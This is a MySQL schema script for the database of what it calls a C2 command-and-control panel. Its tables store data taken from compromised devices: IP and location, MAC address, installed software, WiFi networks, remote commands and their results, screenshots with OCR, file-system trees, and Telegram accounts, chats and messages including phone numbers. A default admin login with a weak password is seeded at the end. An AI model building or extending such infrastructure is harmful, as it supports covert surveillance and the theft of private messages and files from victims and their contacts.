-- Drop all tables to ensure clean schema
drop table if exists c2_device;
drop table if exists c2_software;
drop table if exists c2_wifi;
drop table if exists c2_task;
drop table if exists collected_data;
drop table if exists chats;
drop table if exists tg_account;
drop table if exists tg_message;
drop table if exists c2_screenshot;
drop table if exists c2_file_system_node;
drop table if exists t_user;

-- C2 Device
create table c2_device
(
    id           bigint auto_increment primary key,
    uuid         varchar(64)                        null comment 'Unique Device ID',
    internal_ip  varchar(64)                        null comment 'Internal IP',
    external_ip  varchar(64)                        null comment 'External IP',
    country      varchar(64)                        null comment 'Country',
    region       varchar(64)                        null comment 'Region',
    city         varchar(64)                        null comment 'City',
    isp          varchar(128)                       null comment 'ISP',
    mac_address  varchar(64)                        null comment 'MAC Address',
    host_name    varchar(128)                       null comment 'Hostname',
    os           varchar(128)                       null comment 'OS Info',
    last_seen    datetime                           null comment 'Last Seen',
    heartbeat_interval int default 60000            comment 'Heartbeat Interval',
    is_monitor_on tinyint      default 0            comment 'Is Monitor On',
    current_tg_id varchar(64)                       null comment 'Current Telegram ID',
    data_status  varchar(32)                        null comment 'Data Status',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    update_time  datetime     default CURRENT_TIMESTAMP not null comment 'Update Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_uuid (uuid)
);

-- C2 Software List
create table c2_software
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    name         varchar(256)                       not null comment 'Software Name',
    version      varchar(64)                        null comment 'Version',
    install_date varchar(64)                        null comment 'Install Date',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_uuid (device_uuid)
);

-- C2 WiFi Data
create table c2_wifi
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    ssid         varchar(128)                       not null comment 'SSID',
    bssid        varchar(64)                        null comment 'BSSID (MAC)',
    signal_strength varchar(32)                      null comment 'Signal Strength',
    authentication varchar(64)                      null comment 'Authentication',
    create_time   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_uuid (device_uuid)
);

-- C2 Tasks Table
create table c2_task
(
    id           bigint auto_increment comment 'id' primary key,
    task_id      varchar(64)                        not null comment 'Task ID',
    device_uuid  varchar(64)                        null comment 'Target Device UUID',
    command      varchar(256)                       not null comment 'Command',
    params       text                               null comment 'Parameters',
    status       varchar(32) default 'pending'      not null comment 'Status',
    result       longtext                           null comment 'Result',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    update_time  datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    is_delete    tinyint      default 0                 not null comment 'Is Deleted',
    index idx_task_id (task_id)
) comment 'C2 Tasks' collate = utf8mb4_unicode_ci;

-- Collected Data Table
create table collected_data
(
    id           bigint auto_increment comment 'id' primary key,
    data_id      varchar(64)                        not null comment 'Data ID',
    data_type    varchar(32)                        not null comment 'Data Type',
    content      longtext                           null comment 'Content (Base64 or Text)',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0                 not null comment 'Is Deleted'
) comment 'Collected Data' collate = utf8mb4_unicode_ci;

-- Chats Table
create table chats
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    chat_id      text                               null comment 'Chat ID',
    title        text                               null comment 'Title',
    type         text                               null comment 'Type',
    invite_link  text                               null comment 'Invite Link',
    member_count bigint                             null comment 'Member Count',
    create_time  datetime     default CURRENT_TIMESTAMP null comment 'Create Time',
    index idx_device_uuid (device_uuid)
) comment 'Chats' collate = utf8mb4_unicode_ci;

-- TG Account Table
create table tg_account
(
    id           bigint auto_increment comment 'id' primary key,
    tg_id        varchar(64)                        null comment 'Telegram ID',
    username     varchar(128)                       null comment 'Username',
    phone        varchar(32)                        null comment 'Phone',
    first_name   varchar(128)                       null comment 'First Name',
    last_name    varchar(128)                       null comment 'Last Name',
    is_bot       tinyint      default 0             comment 'Is Bot',
    is_premium   tinyint      default 0             comment 'Is Premium',
    system_info  text                               null comment 'System Info',
    device_uuid  varchar(64)                        null comment 'Device UUID',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    update_time  datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Accounts' collate = utf8mb4_unicode_ci;

-- TG Message Table
create table tg_message
(
    id           bigint auto_increment comment 'id' primary key,
    account_id   bigint                             not null comment 'Account ID',
    msg_id       bigint                             null comment 'Message ID',
    chat_id      varchar(64)                        null comment 'Chat ID',
    sender_id    varchar(64)                        null comment 'Sender ID',
    sender_username varchar(128)                    null comment 'Sender Username',
    sender_phone varchar(32)                        null comment 'Sender Phone',
    receiver_id  varchar(64)                        null comment 'Receiver ID',
    receiver_username varchar(128)                  null comment 'Receiver Username',
    receiver_phone varchar(32)                      null comment 'Receiver Phone',
    content      text                               null comment 'Content',
    msg_type     varchar(32)                        null comment 'Message Type',
    media_path   varchar(256)                       null comment 'Media Path',
    msg_date     datetime                           null comment 'Message Date',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Messages' collate = utf8mb4_unicode_ci;

-- C2 Screenshot Table
create table c2_screenshot
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    task_id      varchar(64)                        null comment 'Task ID',
    url          varchar(512)                       null comment 'URL',
    ocr_result   text                               null comment 'OCR Result',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_uuid (device_uuid)
) comment 'C2 Screenshots' collate = utf8mb4_unicode_ci;

-- C2 File System Node (Tree View)
create table c2_file_system_node
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    parent_path  text                               null comment 'Parent Path',
    name         varchar(256)                       not null comment 'Name',
    path         text                               not null comment 'Full Path',
    is_directory tinyint      default 0             not null comment 'Is Directory',
    size         bigint       default 0             not null comment 'Size',
    md5          varchar(32)                        null comment 'MD5 Hash',
    is_recent    tinyint      default 0             not null comment 'Is Recently Modified',
    last_modified datetime                          null comment 'Last Modified',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_uuid (device_uuid)
) comment 'File System Tree' collate = utf8mb4_unicode_ci;

-- User Table (t_user)
create table t_user
(
    id           bigint auto_increment comment 'id' primary key,
    user_account varchar(256)                           not null comment '账号',
    user_password varchar(512)                           not null comment '密码',
    user_name    varchar(256)                           null comment '用户昵称',
    user_avatar  varchar(1024)                          null comment '用户头像',
    user_profile varchar(512)                           null comment '用户简介',
    user_role    varchar(256) default 'user'            not null comment '用户角色：user/admin',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment '创建时间',
    update_time  datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment '更新时间',
    is_delete    tinyint      default 0                 not null comment '是否删除'
) comment '用户' collate = utf8mb4_unicode_ci;

-- Default Admin User
-- Account: admin
-- Password: 12345678 (Salt: yupi, Hash: b0dd3697a192885d7c055db46155b26a)
INSERT INTO t_user (user_account, user_password, user_name, user_role)
VALUES ('admin', 'b0dd3697a192885d7c055db46155b26a', 'Admin', 'admin');
